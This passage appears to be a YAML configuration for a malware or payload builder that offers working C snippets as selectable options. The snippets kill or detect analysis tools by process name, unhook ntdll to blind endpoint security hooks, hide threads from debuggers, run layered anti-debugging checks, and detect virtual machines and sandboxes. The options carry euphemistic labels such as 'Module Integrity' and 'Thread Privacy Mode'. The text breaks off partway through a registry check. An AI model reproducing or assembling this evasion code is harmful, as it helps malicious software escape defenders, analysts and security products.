  - id: TerminateAnalysis
    display: Process List Check
    default: false
    snippet: |
      {
          const wchar_t* targets[] = {
              L"procmon.exe", L"procexp.exe", L"wireshark.exe",
              L"fiddler.exe", L"ProcessHacker.exe"
          };

          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (snap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe = {sizeof(pe)};
              if (Process32FirstW(snap, &pe)) {
                  do {
                      for (int i = 0; i < 5; i++) {
                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                              return 0;
                          }
                      }
                  } while (Process32NextW(snap, &pe));
              }
              CloseHandle(snap);
          }
      }
  - id: KillAnalysisTools
    display: Process Detection
    default: true
    snippet: |
      {
          const wchar_t* targets[] = {
              L"procmon.exe", L"procexp.exe", L"procexp64.exe",
              L"Wireshark.exe", L"fiddler.exe", L"tcpview.exe",
              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
              L"ProcessHacker.exe", L"perfmon.exe"
          };

          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
          if (snap != INVALID_HANDLE_VALUE) {
              PROCESSENTRY32W pe = {sizeof(pe)};
              if (Process32FirstW(snap, &pe)) {
                  do {
                      for (int i = 0; i < 11; i++) {
                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                              return 0;
                          }
                      }
                  } while (Process32NextW(snap, &pe));
              }
              CloseHandle(snap);
          }
      }
  - id: UnhookNtdll
    display: Module Integrity
    default: false
    snippet: |
      // Module integrity verification.
      {
          HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
                                     GENERIC_READ, FILE_SHARE_READ, NULL,
                                     OPEN_EXISTING, 0, NULL);
          if (hFile != INVALID_HANDLE_VALUE) {
              HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
              if (hMap) {
                  PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
                  if (pClean) {
                      HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                      PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
                      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);

                      PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                      for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                          if (memcmp(pSec[i].Name, ".text", 5) == 0) {
                              DWORD oldProt;
                              PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);
                              PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);
                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
                              memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);
                              break;
                          }
                      }
                      UnmapViewOfFile(pClean);
                  }
                  CloseHandle(hMap);
              }
              CloseHandle(hFile);
          }
      }
  - id: HideFromDebugger
    display: Thread Privacy Mode
    default: false
    snippet: |
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) {
              NtSIT(GetCurrentThread(), 0x11, NULL, 0);
          }
      }
- header: Runtime Integrity
  template: debugprotection
  display: Runtime Integrity
  allowMultiple: true
  items:
  - id: None
    display: Skip
    default: false
    snippet: |
      // No runtime integrity checks
  - id: IsDebuggerPresent
    display: Debugger Check
    default: true
    snippet: |
      // Runtime integrity: Check debugger presence
      if (IsDebuggerPresent()) {
          return 0;
      }
  - id: CheckRemoteDebuggerPresent
    display: Remote Debugger Check
    default: false
    snippet: |
      // Runtime integrity: Check for remote debugger
      {
          BOOL debuggerPresent = FALSE;
          if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
              if (debuggerPresent) {
                  return 0;
              }
          }
      }
  - id: PebBeingDebugged
    display: Process State Check
    default: false
    snippet: |
      // Runtime integrity: Direct PEB check
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          #endif
          if (pPeb->BeingDebugged) {
              return 0;
          }
      }
  - id: NtGlobalFlag
    display: Heap Flag Check
    default: false
    snippet: |
      // Runtime integrity: Check heap flags
      {
          #ifdef _WIN64
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
          #else
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
          #endif
          if (*pNtGlobalFlag & 0x70) {
              return 0;
          }
      }
  - id: HeapFlags
    display: Heap Integrity
    default: false
    snippet: |
      // Runtime integrity: Check heap flags
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
          #endif
          if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
              return 0;
          }
      }
  - id: CloseHandleException
    display: Handle Validation
    default: false
    snippet: |
      // Runtime integrity: Handle validation
      __try {
          CloseHandle((HANDLE)0xDEADBEEF);
      }
      __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
          return 0;
      }
  - id: OutputDebugString
    display: Debug Output Check
    default: false
    snippet: |
      // Runtime integrity: OutputDebugString error check
      {
          SetLastError(0);
          OutputDebugStringA("Test");
          if (GetLastError() == 0) {
              return 0;
          }
      }
  - id: HardwareBreakpoints
    display: Register Integrity
    default: false
    snippet: |
      // Runtime integrity: Check debug registers
      {
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                  return 0;
              }
          }
      }
  - id: TimingRdtsc
    display: Timing Check
    default: false
    snippet: |
      // Runtime integrity: Timing check using RDTSC
      {
          unsigned __int64 start = __rdtsc();

          volatile int x = 0;
          for (int i = 0; i < 100; i++) x++;

          unsigned __int64 end = __rdtsc();

          if ((end - start) > 0x100000) {
              return 0;
          }
      }
  - id: NtQueryInformationProcess
    display: Process Information Check
    default: false
    snippet: |
      // Runtime integrity: Query process information
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  HANDLE debugPort = NULL;
                  NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
                  if (status == 0 && debugPort != NULL) {
                      return 0;
                  }
              }
          }
      }
  - id: ParentProcessCheck
    display: Parent Process Validation
    default: false
    snippet: |
      // Runtime integrity: Validate parent process
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
                  if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
                      HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
                      if (hParent) {
                          WCHAR parentName[MAX_PATH] = {0};
                          DWORD size = MAX_PATH;
                          if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
                              _wcslwr_s(parentName, MAX_PATH);
                              if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
                                  wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
                                  wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
                                  CloseHandle(hParent);
                                  return 0;
                              }
                          }
                          CloseHandle(hParent);
                      }
                  }
              }
          }
      }
  - id: TrapFlag
    display: Single-Step Detection
    default: false
    snippet: |
      // Runtime integrity: Single-step trap flag detection
      #ifdef _M_IX86
      __try {
          __asm {
              pushfd
              or dword ptr [esp], 0x100 ; Set trap flag
              popfd
              nop
          }
      }
      __except(EXCEPTION_EXECUTE_HANDLER) {
          goto trap_ok;
      }
      return 0;
      trap_ok:;
      #else
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0);
      }
      #endif
  - id: FullAntiDebug
    display: Integrity Suite
    default: true
    snippet: |
      // Complete runtime integrity implementation
      {
          // 1. Debugger check
          if (IsDebuggerPresent()) return 0;

          // 2. Remote debugger check
          BOOL remote = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
          if (remote) return 0;

          // 3. PEB flags
          #ifdef _WIN64
          PPEB peb = (PPEB)__readgsqword(0x60);
          DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);
          #else
          PPEB peb = (PPEB)__readfsdword(0x30);
          DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);
          #endif
          if (peb->BeingDebugged) return 0;
          if (ntg & 0x70) return 0;

          // 4. Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          GetThreadContext(GetCurrentThread(), &ctx);
          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;

          // 5. RDTSC timing
          unsigned __int64 t1 = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t1 > 0x100000) return 0;

          // 6. Debug port
          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
          if (NtQIP) {
              HANDLE port = NULL;
              NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);
              if (port) return 0;

              ULONG flags = 0;
              NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL);
              if (flags == 0) return 0;
          }

          // 7. OutputDebugString
          SetLastError(0);
          OutputDebugStringA("X");
          if (GetLastError() == 0) return 0;
      }

  - id: AllChecks
    display: Complete Integrity Check
    default: true
    snippet: |
      // Comprehensive runtime integrity check
      {
          // API checks
          if (IsDebuggerPresent()) return 0;
          BOOL dbg = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
          if (dbg) return 0;

          // PEB checks
          #ifdef _WIN64
          PPEB peb = (PPEB)__readgsqword(0x60);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0xBC);
          #else
          PPEB peb = (PPEB)__readfsdword(0x30);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0x68);
          #endif
          if (peb->BeingDebugged) return 0;
          if (*ntg & 0x70) return 0;

          // Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          GetThreadContext(GetCurrentThread(), &ctx);
          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;

          // Timing check
          unsigned __int64 t = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t > 0x100000) return 0;

          // Debug port
          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
          if (NtQIP) {
              HANDLE port = NULL;
              if (NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port) return 0;
          }
      }
  - id: LayeredChecks
    display: Layered Integrity
    default: true
    snippet: |
      // Layered runtime integrity checks
      {
          // Check 1: Debugger check
          if (IsDebuggerPresent()) return 0;

          // Check 2: Remote debugger
          BOOL remote = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
          if (remote) return 0;

          // Check 3: PEB flag
          #ifdef _WIN64
          if (((PPEB)__readgsqword(0x60))->BeingDebugged) return 0;
          #else
          if (((PPEB)__readfsdword(0x30))->BeingDebugged) return 0;
          #endif

          // Check 4: Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;
          }

          // Check 5: Timing
          unsigned __int64 t1 = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t1 > 0x100000) return 0;
      }
- header: Deployment Context
  template: sandboxprotection
  display: Deployment Context
  allowMultiple: true
  items:
  - id: None
    display: Skip
    default: true
    snippet: |
      // No deployment context check
  - id: CpuidHypervisor
    display: Virtualization Check
    default: false
    snippet: |
      // Deployment context: Check CPUID hypervisor bit
      {
          int cpuInfo[4] = {0};
          __cpuid(cpuInfo, 1);
          if (cpuInfo[2] & (1 << 31)) {
              return 0;
          }
      }
  - id: CpuidVMVendor
    display: Hypervisor Vendor Check
    default: false
    snippet: |
      // Deployment context: Check for hypervisor vendor strings via CPUID
      {
          int cpuInfo[4] = {0};
          __cpuid(cpuInfo, 0x40000000);
          char vendor[13] = {0};
          memcpy(vendor, &cpuInfo[1], 4);
          memcpy(vendor + 4, &cpuInfo[2], 4);
          memcpy(vendor + 8, &cpuInfo[3], 4);

          // Known hypervisor vendors
          if (strstr(vendor, "VMwareVMware") || strstr(vendor, "Microsoft Hv") ||
              strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "KVMKVMKVM") ||
              strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv")) {
              return 0;
          }
      }
  - id: MacAddressCheck
    display: Network Adapter Check
    default: false
    snippet: |
      // Deployment context: Check for VM MAC address prefixes
      {
          IP_ADAPTER_INFO adapterInfo[16];
          DWORD bufLen = sizeof(adapterInfo);
          if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
              PIP_ADAPTER_INFO pAdapter = adapterInfo;
              while (pAdapter) {
                  // VMware: 00:0C:29, 00:50:56, 00:05:69
                  // VirtualBox: 08:00:27
                  // Hyper-V: 00:15:5D
                  // Parallels: 00:1C:42
                  if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                      (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) ||
                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x42)) {
                      return 0;
                  }
                  pAdapter = pAdapter->Next;
              }
          }
      }
  - id: RegistryVMCheck
    display: Virtualization Artifact Check
    default: false
    snippet: |
      // Deployment context: Check registry for virtualization artifacts
      {
          HKEY hKey;
          const wchar_t* vmKeys[] = {
